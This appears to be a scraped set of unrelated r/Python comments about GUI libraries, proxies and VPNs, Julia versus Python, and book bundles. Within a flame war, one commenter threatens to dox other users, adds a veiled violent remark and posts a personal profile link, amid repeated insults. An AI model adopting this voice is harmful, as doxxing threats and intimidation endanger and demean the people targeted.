From [urllib's docs](https://docs.python.org/3.7/library/urllib.request.html#module-urllib.request): &gt; In addition, if proxy settings are detected (for example, when a \*\_proxy environment variable like http\_proxy is set), [ProxyHandler](https://docs.python.org/3.7/library/urllib.request.html#urllib.request.ProxyHandler) is default installed and makes sure the requests are handled through the proxy. You would probably have an easier time using proxies with [Requests](http://docs.python-requests.org/en/master/user/advanced/#proxies) though.
Already tried some codes like this one but i always get error, probably my python version is not good with that. I just cant change my proxy ....
Give Requests a shot!
I've posted about this before, but using QT Designer it's incredibly easy to make GUIs for python. Basically you do a WYSIWYG design and that creates a file like this one: [https://github.com/djotaku/ELDonationTracker/blob/master/design.ui](https://github.com/djotaku/ELDonationTracker/blob/master/design.ui) Then you just run a program that turns it into: [https://github.com/djotaku/ELDonationTracker/blob/master/design.py](https://github.com/djotaku/ELDonationTracker/blob/master/design.py) Then you just import that file like so: [https://github.com/djotaku/ELDonationTracker/blob/master/gui.py](https://github.com/djotaku/ELDonationTracker/blob/master/gui.py) You have to import it because any time you make a change to the GUI and re-run the python generator it's going to erase the second file.
Ahh, the eternal quest for porn. In the interests of international cooperation and harmony; you'd normally want to run your entire connection through the VPN. Sounds like the chrome plugin only directs browser traffic through it.
And Humble Bundle has a book by the publisher Pakt on PyQT5 programming
so i will have to setup python again right?(the old version) because "requests" doesnt work in newer version. im just asking to be sure , im new at python
Take a look at [PySimpleGUI](http://www.PySimpleGUI.org). The [PySimpleGUI Window Designer](https://pysimplegui.readthedocs.io/#the-window-designer) is simple to use. tkinter can be "dressed up" by using your own custom artwork for buttons. tkinter and Qt have similar looking widgets. Qt's a little further refined, but they don't differ all that much. Adding color, getting font sizes right, being clever with the layout, using images are a few ways to improve the look over using the standard system settings. &amp;#x200B;
Stop reminding me of OpenSUSE Linux's numbering scheme over the past ten years or so.... 11.0, 11.1, 11.2, 11.3, 11.4, 12.1, 12.2, 12.3, 13.1, 13.2, 42.1, 42.2, 42.3, 15.0
&gt;you'd normally want to run your entire connection through the VPN. its ok... BUT HOW DO I DO IT? MASTERS, PLEASE TEACH ME &amp;#x200B; and yeah, chrome vpn only works in chrome. there should be a solution for this!
What version of Python are you running? Requests should work on [2.7 and 3.4-3.7](http://docs.python-requests.org/en/master/#beloved-features)
Is this in reference to the Python podcast?
Rubber baby buggy bumpers
Well there is, but I'm afraid what that solution is depends on your OS, the VPN provider you're connecting to, and what sort of VPN protocol they're using. There's quite a few variations on the idea (OpenVPN, SSTP, L2TP, IPSec, PPTP, the list goes on... and of course there's also Tor in a class of its own). Unfortunately the best way is also often country specific... if you're in China, for instance, many of the VPN providers I'd tend to use elsewhere simply don't work.
I'm using 3.7. there are 2 problems actually. I dont know how to install "requets" &amp;#x200B; and even if it does work, i dont know how to connect a proxy to python. &amp;#x200B; Im watching this video and this guy easily changes his ip with simple code. [https://youtu.be/vzQKS9y4cAM?t=146](https://youtu.be/vzQKS9y4cAM?t=146) When I do the same thing , it says "AttributeError: module 'urllib' has no attribute 'urlopen' &amp;#x200B; GOD...
i live in Turkey, and im using windows 10. and its GOM vpn , the free version &amp;#x200B; so what should i do now
Check out AppJar while you're at it. It's not as full featured, but if you just need a simple, decent looking GUI it fits the bill in much fewer lines of code.
Haha brilliant
Haha brilliant
Well, GOM is browser only, they don't offer any sort of service for full connection VPN. For that you'd probably want to look at something like NordVPN. You can get instructions on signing up etc via GOM, I'm afraid I'm not a Windows user at all and can't talk you through that part. NordVPN is supposed to be much simpler than Private Internet Access, which I used when traveling in Turkey a few years back... it was quite a bit cheaper and they're extremely strong on privacy, but it's much more "hands on" in terms of configuring it than most. Once you've set up your whole connection to go through VPN it's pretty simple, you just turn on the VPN, wait for a connection, then urllib should work as normal without doing anything else. If you were on a Mac I'd point you at CyberBear as they're basically automatic configuration, but last I checked their service is Mac and iOS only.
I tend to write scripts that generate reports for work. Try collecting some data on a regular basis and mapping/reporting on it with Python. Give the system a simple GUI with tkinter or AppJar and learn about pyinstaller so you can pass it off to someone else. Check out Automate the Boring Stuff. It has a ton of projects that actually have real world applications. It's how I learned about my first scripts.
Building a simple herd management application for the family farm
&gt; Hey kid, I won't be that douche tlaking money - ...okay, &gt; but I'll say I cleared 6 figures easily every year. WHy? So you lie twice in the same sentence. Because someone who can't even form a coherent argument most definitely doesn't "clear 6 figures easily every year". &gt; Becuase I understood you guys. I knew what to look for. I knew the type of techie I was gonna get a call about 2 months down the road from my client: "Yet another techie who thinks he's smarter than his manager and has too much pride to know his/her place. Sorry, Aaron, but let them know they're last day is today." See the beauty of this is it's not about being smart, the majority of managers legitimately don't know what they need. But, anyway, what does any of this have to do with you disagreeing with a dictionary? &gt; I give a SHIT if anyone cares about my career. Why on EARTH would anyone in the first place? Well you're throwing it around like it's something that matters and people should take your word because of it so you definitely do give a shit. Don't know why though. &gt; My point is that I made a lot of money working countless hours sifting through the douche bags that make up 90% of the IT industry. Cool. &gt; I'm an expert on you. I know how you think and I know your bullshit antics. When you're see if 60 hours a week for 6 years, nothing can describe the experience but uncanny. Is this a new tech recruitSEAL copypasta? &gt; Little more background to give some insight: I've have probably 10 of these pissing matches over this one post and another where I was defending a dude who put up a tutorial video, that was actualy VERY, very good, and sure enough: you all came in scores to berate him. I resent you all for that constant shit. Probably because I'm the opposite. None of us are berating this guy. All we are saying is an article is a better format than a video, and that computer science and programming are not the same thing. The first is an opinion and not beratement. Nobody said "FUCK YOU YOUR VIDEO IS SHIT". The second is an easily provable fact by looking at any damned dictionary. https://www.dictionary.com/browse/computer-science https://www.dictionary.com/browse/programming https://www.techopedia.com/definition/592/computer-science https://www.techopedia.com/definition/13128/programming https://softwareengineering.stackexchange.com/questions/137103/whats-the-difference-between-computer-science-and-programming Do you need anymore? &gt; So, you could say all this is brought on me. In a vacuum of 2 simple posts, yeah, seems bullshit. I have no idea what you're even saying any more? I'd ask "are you foaming at your mouth" but you're typing. &gt; I kick shit into your faces as much as I can because I'm weary of your grotesque, pompous attitudes. ANd I will let you hear it. Every.Time. Firstly, kinky. Kick me daddy. Secondly, based on that if anything you're who the title of this post applies to.
I always felt like Julia was more of a niche language (although a very interesting one). I think the main ML languages are Python and C++
Think of it like a sandbox that you can do whatever you want in. You can have as many different sandboxes as you want. You can use a fresh sandbox for every project you start, and you don't have to worry about it messing up the stuff you built in another sandbox. If you're just learning, then you really just need one virtual environment for now.
That’s what I’ve read. But Tensorflow and a lot of other big ML libraries are supported in Julia. I think Julia has a legitimate chance of becoming a “mainstream” ML language and not just a niche language. It is noticeably faster than python in a lot of ways, both in writing and in any situation with large numbers, like ML. My only problem is my lack of experience and therefor problem with learning something a bit complicated in a new language with little support. If I had more experience I would have gone for Julia as the experience feels better for me, but as of now I can only do Python ML. I have no problem with Julia code in it self, I just struggle applying the ML part to Julia, lack of docs I guess.
It really looks nice, just tried Hugo SSG yesterday and I liked it, but I'll give yours a shot too. Theme looks nice on mobile and smaller devices, but on computer it looks really minimal, like it's missing something.
Give me $350 and I'll download some ebooks for you
What data points are you recording and what kind of outputs are you producing? This peaked my interest because I'm trying to figure out a herd management system of my own... only the heard is youth through high school wrestlers lol. We are trying to manage the weight, weight variance, win/loss, points for/against etc...
This guy must be a lot of fun at parties.
Give me $350 and I'll send you some ebooks, and links to youtube :D
I'm yet to try ML stuff(but already have some books ready once I'm finished with Rust :D) so I'm no expert on the matter but I'm very confident in writing Python. I really doubt that Julia is more effective than python if you're on the same level with both languages. I see Julia getting really big in scientific computing. Have your tried PyPy already?
Again the pretentiousness that we just don't share. I don't obsess over making people think I'm superious to them in every way. I don't give a shit. I type fast. Sue me. My biggest year was 240, asshole. 130-150 every year after my 2nd. Step off, bitch.
People love me at parties. It's when they hear I'm attending their code review that they break into a cold sweat.
It's a shame they designed it to appeal to matlab users. It seems pretty smart otherwise, though.
she even made the printing guy at the shop download the official font!
Yeah. I use it a lot to create efficient solutions to mathematical problems I find online, another hobby of mine (yes I am that nerdy). That might be the reason for my bias against Julia too. 
I’m very jelly, she’s def a keeper. 
Not yet, gonna try it after work. Looking like I’m focusing on python for now, really nice feedback. Might go back to Julia when it gets a bigger user base and more ML support as I know it’s a focus for the developers of the language.
Bahaha well done. I appreciate anyone with an expert level understanding of any language, but I will say that some (including myself), write code out of necessity to produce a solution to a problem(hack it together). Still learning python myself, I don't anticipate that I will ever be an expert. 
Are you planning on learning ML using rust?
PyQT all the way. Cleaner, easier, has what you need, and looks better. 
&gt; I want to use a intuitive and easy language I dont know much about Julia, but I think it is very fast? It also has CLOS-style multiple-dispatch while Python only has single-dispatch without hooking in a 3rd party library. Oddly , Julia has 1-indexing instead of 0-indexing.
Nah, I really just want the basics of how to use it, I don't have the needed maths background to really develop deep down ML stuff I think and I'll do that with Python. I Just want to get Rust and somehow embedded C/C++ down before It's time for me to apply for a job in a few months (really only C/C++, Rust is more Just for fun)
im not the best, but I'm pretty good
Project Euler intesifies :D
Yes, Julia is very fast. Although a bit narrow sometimes. Maybe the best math language out there, including matlabs. Very intuitive for beginners as well, if you know python, you can probably get okay at Julia in a day. 
Beeware togaware for single page is still good.
Well yeah, they had it yesterday.
I am very surprised about how friendly and helpful and at the same time interested this subreddit is! Most subreddits are quite negative and toxic. I guess this is quite niche and therefor people are more prone to be positive to other likeminded people..
&gt; I don't obsess over making people think I'm superious to them in every way. Then why do you keep talking tough about kicking shit and how much money you make? &gt; I don't give a shit. Your responses indicate the exact opposite &gt; I type fast. I wasn't mentioning your horrible spelling and grammar. Your argument is incoherent, incomprehensible, and incompetent. You're argument doesn't flow at best, spitting word salad at worst (which is the more often occurrence). &gt; My biggest year was 240, asshole. 130-150 every year after my 2nd. Coming from the same person who says &gt; I don't obsess over making people think I'm superious to them in every way. Are you in the seventh grade? You gonna tell me you fucked my mom's corpse in CoD too now?
What's the overhead involved with pycharm? I've recently started coding and I've exclusively used pycharm so I'm wondering what you would consider overhead?
I actually prefer using Kivy. It’s super simple and once you get a hang of it you can do some really amazing things with your GUI.
Neither did I. Then suddenly I was one. Mainly because I kept saying "there has _got_ to be a better way of doing this" and there always was. When you pass hacking and start engineering this entire new world opens up for you. Though once you've seen it you'll hate looking at hacks.
It is incredibly an interesting synergy between Julia and various Python performance efforts aimed at MatLabs such as Numba and and PyWren. Both Numba and Julia run on LLVM. My initial tests were from a year ago and both platforms have improved since then. The UC Rise Labs project also came up with Pywren which has the intention of moving people off of their single computer environment and enable them to run MatLabs kinds of problems on large scale back-ends. See PyWren: https://github.com/pywren/pywren http://pywren.io/ https://rise.cs.berkeley.edu/projects/pywren/ Numba: http://numba.pydata.org/
I tried the python QT5 library mentioned earlier and I felt like it was way complicated. I built a calculator with Tkinter and it was easier, but still not exactly intuitive. Either way, both libraries have steep learning curves, I just think QT is steeper.
&gt; Pycharm will always make a virtual environment for every project, so all libraries you use will be specific to that environment, specific to that project. This is good practice, and very nice of Pycharm to do so. But this happens all automagically and newbies have no clue about virtual environments. Wait what?? My PyCharm has never done this.
That last part, that's just Eminem's influence on me. MY argument isn't well written. It takes too much time to consider every way you could take the text im sending literally without **subtext** (you know, like, the 90% of the reason we can even communicate clearly in general). Yeah, there is zero of that via text. So I assume the reader goes half way and instead of just framing it how'd he'd like (or simple incoherent garbage, I guess), he'd take maybe a minute to use that brain of yours to take what you can from context and make up for the lack of the sub part of that, I then assume if it is just too confusing, you ask for clarification. I am one unreasonable son of a bitch. Proof I simply just dont' care - because I know you're parsing every damn thing to throw a jab. The thought of giving half a shit blows my mind.
I don’t know if it’s still on sale, but I’m also currently learning python and I’m learning through Udemy “zero to hero” python course. You can get it for like 10-11 dollars if it’s still on sale. But there’s plenty of reseouces online that you can use for free like Coursesera
I got that humble bundle package and I'm going to check out some YouTube. If I don't learn form that I will move onto courses
Hello! I'm a bot! It looks to me like your post might be better suited for r/learnpython, a sub geared towards questions and learning more about python. That said, I am a bot and it is hard to tell. I highly recommend posting your question there. Please follow the subs rules and guidelines when you do post there, it'll help you get better answers faster. Show /r/learnpython the code you have tried and describe where you are stuck. **[Be sure to format your code for reddit](https://www.reddit.com/r/learnpython/wiki/faq#wiki_how_do_i_format_code.3F)** and include which version of python and what OS you are using. You can also ask this question in the r/Python discord: https://discord.gg/3Abzge7, a large, friendly community focused around the Python programming language, open to those who wish to learn the language or improve their skills, as well as those looking to help others. *** [^(README)](https://github.com/CrakeNotSnowman/redditPythonHelper) ^(|) [^(FAQ)](https://github.com/CrakeNotSnowman/redditPythonHelper/blob/master/FAQ.md) ^(|) ^(this bot is written and managed by /u/IAmKindOfCreative) ^(This bot is currently under development and experiencing changes to improve its usefulness)
You could use `pd.Series.where`, something like df['BG3'] = df.BG1.where(df.BG2.isnull(), df.BG2) which you can read like "take from BG1 where BG2 is null, otherwise take from BG2".
Thank you my good bot!
I was thinking Winamp. 3 was so bad, so they skipped f4.
Html requests can do link extraction. You really want to use a headless browser as a last resort, because the memory overhead is enormous. If you don't have a choice, requestium let's you switch between https requests and a chrome browser controlled with selenium lib. I have never heard of someone trying to save the html, css, and JavaScript and then loading it and parsing it later....it sounds expensive.
PyQt5 is licensed under GPL, if you havent acquired a commercial License. You could use PySide2 if the GPL is too restrictive for your purpose. 
Amazing how a library made for visuals (GUI) would have such an ugly website without any screenshots.
PySimpleGui
Okay you're straight up either high, in a delusional break, or rabid now. So I plead you to just go back on your meds, but other than that, have a good day man.
Well that's the thing. Visitor isn't about how to iterate over elements, but rather what to do with each element. An example from the standard library is NodeVisitor in ast. Now it's true that the default behavior is to visit each child and do nothing, which is kind of like iteration, but the point is to subclass and add your own methods for how to visit each kind of node. You may or may not want to recursively visit children, and if you don't you'd be using your visitor to visit objects in the order given by ast.walk or any other iterator if you want control over the order. So the business of iteration can be separated from the business of visiting. An alternate approach would be to define a polymorphic method in each of the visited classes, but that could break the open / closed principle. Another alternative would be to use dicts or branch statements to control the implementation used for each kind of visited class, but that could get messy if there are a lot.
Use the socks proxy that your tor client creates. https://stackoverflow.com/questions/5148589/python-urllib-over-tor
I made a few GUIs in the past with Chaco. Not sure how well maintained it is now, but at the time it was pretty useful for real-time data viewing apps (better than matplotlib in many ways). Perhaps not so well suited for generic GUIs but worth a look if it’s still maintained.
I've used Tkinter and PyQt. I recommend PyQt
Can I ask a related question, in what's the best TUI builder/toolkit in 2019?
I don't think any of the GUI toolkits have good screenshots
It was a typo `&lt;blackslash&gt;n` is the "newline" control char. &gt;&gt;&gt; print("dummy\n") dummy &gt;&gt;&gt; print("dummy/n") dummy/n 
https://wxpython.org/pages/screenshots/ Literally a whole page for screen shots, right under the about tab Also the color choice may be poor, but other than that the website looks perfectly fine imo.
Yeah I saw that it didn't work. However, it seems that each of those return key thingies is sent as a separate message, so there's my break...even better.
Ah the about tab. I didnt think to look there. 
Try the cartopy site and look at the examples or look at the implementation for the library, the comments are pretty helpful.
Link please
One issue is that posters (and commenters) have to recognize that reddits generally fall somewhere between austere peer reviewed academic publications and a crowded, noisy inner city playground. The politest denial from an academic pub can be far more devastating than a "go eff your mother" on a play ground. The denizens of this reddit seem to strike a nice balance between the two. On top of that the guy that made the tutorial seemed to take comments--negative and positive--in stride. He has been posting stuff like this on various reddits for a while and I'm sure he is more than aware that his work works for some and doesn't work for others. It was 100% a self-promotion post (and totally nothing wrong with that)--a 3rd party expecting it to get nothing but universal acclaim on this reddit sort of denigrates this reddit. I applaud the guy doing 400 two-minute videos on various crud with a git repository with 4 commits. But when it is posted to r/python I feel no remorse over calling that bull shit out.
I thought there was one but I was unable to check until just now
Dude Tkinter has gotten some great upgrades. Tk always had a rep for just being a shit-looking gui framework. They're changes. And you can always do a lil' bit of graphic design. Not complicated, simpler the better! But if you feel you need that touch, it wouldnt take more than a day. &amp;#x200B; But Tk's the way to go, for me. THey've cleaned up their code a LOT too. &amp;#x200B; &amp;#x200B;
Python *is* strongly typed, for the record. 
Instead of flask i'd suggest django. It's structure and session management might seem more familiar from their background. Flask might be "too lean"" for their taste 
Fantastic work! I was just handed a new problem today that deals with pulling information out of a pdf. I look forward to giving this a whirl.
&gt; Tkinter is quite old and doesn't look very modern Why you gotta hurt me like that. I like the Tkinter look.
its only 4 days into the new year and asking for new applications, jeez!
Been on addy all day, bro. Remember that line? You must've missed it. Or not. But it's about a mile behind you. Read one of my posts on my dream project to pull the nasties dick holes from Git, SO, reddit, etc, and DOXX the shit out of them I'm using all my reddit content for the sentiment analysis. WHOA! Rest eeeasy.... lol. Rest easy. Likely you wont be my first one. I know when someone pulls out low blows like you pulled on me, I did a lot more to them than reversed. Hell, easier to pull a trigger than get you triggered to that point. Have a a good day, too. I'm Aaron Brandhagen, and my linkedin: [https://www.linkedin.com/in/aaron-brandhagen-499927137/](https://www.linkedin.com/in/aaron-brandhagen-499927137/) Guaranteed you'll be hearin' that name again. (yeah, a musician too). Later. &amp;#x200B;
I like Tkinter but a lot of people are saying that PyQt is the way to go for modern applications
For real?? I've jst gotten so used to Tk. I would assume that depends on your end project? Or not even that?
You can since Python 3.6. Earlier versions don't have that.
Ugh. I hope not. Singletons are a terrible antipattern.
Right. I'm just looking at the case where if I write x = y + z with y as an int and I replace it with a float that creates different op codes at the LLVM level and that could reduce the value of optimization. Despite that, Numba performed relatively well. I should have said dynamic. Will correct.
I do not understand your complaint about python 
I might just be a noob
pip install PyQt5
....seriously please just get help man.
Tk is slow and lacks features. It'll work for a simple interface.
Save some clicks: [https://www.humblebundle.com/books/python-packt-2019-books?partner=domabrat](https://www.humblebundle.com/books/python-packt-2019-books?partner=domabrat)
No problem :) I don't really mind it once in a while, but you can imagine that it would cover up all of the relevant discussion.
I meant for documentation 
https://www.humblebundle.com/books/python-packt-2019-books and for 9 more days
What problem developers had?
http://lmgtfy.com/?q=PyQt5
Posted a few times already - https://www.reddit.com/r/Python/comments/abmq1s/humble_book_bundle_python_2019_by_packt/
🖕🏾
I second pluralsight because of the assessments and amount of content. Including ancillary but necessarily subjects like deployment, git, testing, containers etc....if you can think of it they probably have something. Actually they are a little light on Go content but you didn't ask about that...
Word of caution: Books published by Packt are generally considered to be of dubious, or rather very "hit or miss" quality. I bought a Packt bundle before, and there *is* good information in them, but the methods of writing and teaching the content is definitely not up to the same standards as OReilly or Apress when comparing final products.
https://www.humblebundle.com/books/python-packt-2019-books 
More low rent SPAM. Direct link: https://www.humblebundle.com/books/python-packt-2019-books Please report this user.
Good point. Most things are just "there." 
* An import statement is not free. Importing modules in a hot path may add some (small) overhead. * Imports within functions may delay ImportErrors up until much later and make debugging harder. * Dependencies of a module or script are more hidden if the imports are not at the top of the file, and the module may be harder to read and understand. * [Importing from within threads](https://docs.python.org/2/library/threading.html#importing-in-threaded-code) has some limitations, and it is easy to call functions in threads without knowing that they contain import statements. Other than that, if it makes sense for your use-case, why not? 
The three arguments that I know of to put imports at the top of your module are: 1. [PEP 8](https://www.python.org/dev/peps/pep-0008/#imports) recommends this. It's admittedly a stylistic argument and not a technical argument, but "readability counts." 2. Imports are fast but not instantaneous. If you import within your function, then calls to your function will take a touch longer. 3. It's often more convenient to get `ImportError`s when you first run your program rather than when your program first calls your function. The one (bad) argument that I know of to put imports within a function is to avoid circular imports. But in this case, it's often worth refactoring/restructuring your modules. &amp;#x200B; I hope that helps!
Julia is awesome, but Python really has no competition when it comes to ML. Too many well-made libraries. Also, language speed benchmarks are pointless when discussing ML. Under the hood, all of your code will be running in highly optimized compiled Fortran or (CUDA) C(++) anyway.
Thanks
Working on a script that runs on a raspberry pi zero. It logs into my school account to check my grades. If they got updated, it sends me an email. I no longer have to constantly check my grades to see if my teachers put in my grades! 
https://docs.python.org/
Anyone know if they fixed the web deployment? 
Thanks for your answer. About #3, For the case of module in a 3D software. Pushing a module in production with a bad import can cause the software to fail to start and fail the entire render farm (in extreme cases) so having import failure at function execution can be a good thing. This is one other reason I often use this. 
A couple other things: - design patterns in python. some might not be applicable do to it's double inheritance and magic functions (AOP/Builder). Or how simple/trivial "dependency" injection is. - Working with enums are a bit awkward vs how they're in .net/java because everything is an object. So an enum would be a class itself (minor thing though). - Threading use cases limitation due to GIL. They mostly have to think of multi process instead. (Talk about pupular libs to work with for memory management or techniques) - vscode text editor + gitblame might be familiar to home for them (in terms of IDEs).
https://realpython.com
The import mess was fixed (early?) in Python 3
PyQt5 or PySide would be the most complete libraries for that purpose (I think) but there is also a toolkit called [toga]( https://github.com/pybee/toga) that looks pretty good.
Pyside2 or PyQt5 are probably the best options for modern GUIs, IMO. They're both Python bindings for Qt but have slightly different licenses and implementations. Pyside2 is less restrictive so probably worth going with that if you're starting from scratch. 
From the release history, a new release is released every couple of days without any release notes.
In this case however, a singleton could effect equality.
Sweet